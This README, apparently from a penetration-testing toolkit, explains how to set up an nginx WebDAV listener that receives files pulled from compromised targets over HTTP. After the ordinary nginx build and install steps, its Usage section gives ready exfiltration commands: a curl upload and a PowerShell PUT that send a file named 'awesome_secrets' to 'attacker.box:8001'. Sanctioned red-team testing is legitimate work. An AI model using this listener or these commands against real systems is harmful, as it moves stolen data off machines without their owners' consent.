# nginx File Listener
This is an nginx configuration that you can use to set up a server to receive files from a
target over HTTP.  Most targets can talk out over HTTP, so this helps if you have limited options
to transfer files from a target.

## Requirements
You will need an nginx server set up with the WebDAV module built in.  Kali Rolling (as of September 2018) has this module built in.  If you get an error from nginx that ```dav_methods``` is not valid, you will likely need to build a version of nginx that has this module built in.  You can use the ```--with-http_dav_module``` configuration parameter to build the module in at compile time:

```bash
./configure --with-http_dav_module
```

## Installation
1.  Create a directory to receive your uploads in and make sure the user running nginx has permission to write to this folder.  nginx runs as the ```www-data``` user on Kali.  Make sure line 40 of nginx_file_listener reflects the path you choose.
2.  Modify lines 28 and 31 if you want to change the port that the server listens on (default is 8001).
3.  Copy nginx_file_listener to ```/etc/nginx/sites-available```.
4.  Create a symlink to nginx_file_listener in /etc/nginx/sites-enabled.
    ```bash
    ln -s /etc/nginx/sites-available/nginx_file_listener /etc/nginx/sites-enabled
    ```
5.  Restart nginx
    ```bash
    systemctl restart nginx
    ```
6.  Make sure nginx is listening on the port you chose:
    ```bash
    netstat -anp | grep 8001

    # You can also use ss
    ss -tap | grep 8001
    ```

## Usage
You can upload files to the server using curl from a Linux box:
```bash
curl --upload-file <file_name> http://<server_IP>:<port>/<path>

# Example
curl --upload-file awesome_secrets http://attacker.box:8001/secretfiles
```

The example will upload the file ```awesome_secrets``` to ```/var/www/uploads/secretfiles/awesome_secrets``` on the server.

On Windows, you can use the following bit of PowerShell (requires PowerShell 3.0+):
```powershell
Invoke-RestMethod -Uri http://<server_IP>:<port>/<path>/<file name> -Method Put -InFile <path to file>

# Example
Invoke-RestMethod -Uri http://attacker.box:8001/secretfiles/awesomesecrets -Method Put -InFile awesomesecrets
```
